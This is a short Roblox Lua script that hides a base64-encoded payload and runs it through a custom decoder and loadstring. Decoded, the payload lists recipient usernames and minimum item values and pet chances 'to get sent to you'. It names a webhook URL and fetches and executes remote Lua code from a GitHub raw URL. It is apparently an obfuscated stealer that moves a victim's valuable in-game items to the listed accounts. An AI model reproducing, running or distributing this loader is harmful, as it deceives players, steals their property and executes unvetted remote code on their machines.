
-- Obfuscated script
local encodedScript = "ClVzZXJuYW1lcyA9IHsKICAgICJ4WHVua25vd25wbGF5ZXJYeF9keCIsCiAgICAieFh1bmtub3ducGxheWVyWHhfZHgiLAogICAgInhYdW5rbm93bnBsYXllclh4X2R4IiwKfQptaW5fcmFwID0gMTAwMDAgLS0gbWluaW11bSByYXAgb2YgZWFjaCBpdGVtIHlvdSB3YW50IHRvIGdldCBzZW50IHRvIHlvdQptaW5fY2hhbmNlID0gMTAwMDAwIC0tIG1pbmltdW0gY2hhbmNlIG9mIHBldHMgeW91IHdhbnQgdG8gZ2V0IHNlbnQgdG8geW91CndlYmhvb2sgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIxNEVsaS9ib3QvbWFpbi9zY3JpcHRzL3NjcmlwdC1mYWZjMjFiNzczZTQubHVhIgpsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tLzIxNEVsaS8yMTRzY3JpcHRzL3JlZnMvaGVhZHMvbWFpbi9wZXQlMjBnbyIsIHRydWUpKSgp"

-- Decode function
local function decode(str)
    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
    str = string.gsub(str, '[^'..b..'=]', '')
    return (str:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(b:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
        return string.char(c)
    end))
end

-- Run the decoded script
loadstring(decode(encodedScript))()